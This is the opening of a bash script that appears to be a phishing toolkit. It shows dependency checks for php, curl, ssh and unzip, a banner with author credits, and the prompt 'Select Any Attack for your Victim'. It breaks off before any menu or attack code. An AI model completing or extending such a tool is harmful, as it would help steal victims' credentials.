trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
}
banner() {
clear
printf " \e[33;1m o--o  o  o o-O-o  o-o  o  o o--o o--o      o--o  o--o   o-o     o----o o----   o-----o        \e[0m\n"
printf " \e[33;1m |   | |  |   |   |     |  | |    |   |     |   | |   | o  /o    |    | |          |     \e[0m\n"
printf " \e[33;1m O--o  O--O   |    o-o  O--O O-o  O-Oo  \ / O--o  O-Oo  | / | \ /|----| |----      |         \e[0m\n"
printf " \e[33;1m |     |  |   |       | |  | |    |  \   o  |     |  \  o/  o  o |    | |          |      \e[0m\n"
printf " \e[33;1m o     o  o o-O-o o--o  o  o o--o o   o / \ o     o   o  o-o  / \o----o |---- S    |                \e[0m\n"
printf " \n"
printf " \e[1;92m v1.0, Author: Itzu Myk                                                                      \e[0m\n"
printf " \n"
printf " \e[1;31m ×=========================================================================================×                           \e[0m\n"
printf " \e[1;31m ×         Developer - Itzu Myk                                                            ×                            \e[0m\n"
printf " \e[1;31m ×      Instagram - @itzumyk (https://instagram.com/itzumyk?igshid=i6r4swwfb99c)           ×                             \e[0m\n"
printf " \e[1;31m ×         YouTube - Itzu Myk (https://www.youtube.com/channel/UCEbvRFT5j6ksLf2TIypwr0A)   ×                              \e[0m\n"
printf " \e[1;31m ×=========================================================================================×                               \e[0m\n"
printf " \n"
printf " \e[36;1m.:.Select Any Attack for your Victim.:.\e[0m\n"
printf " \n"
}
menu() {
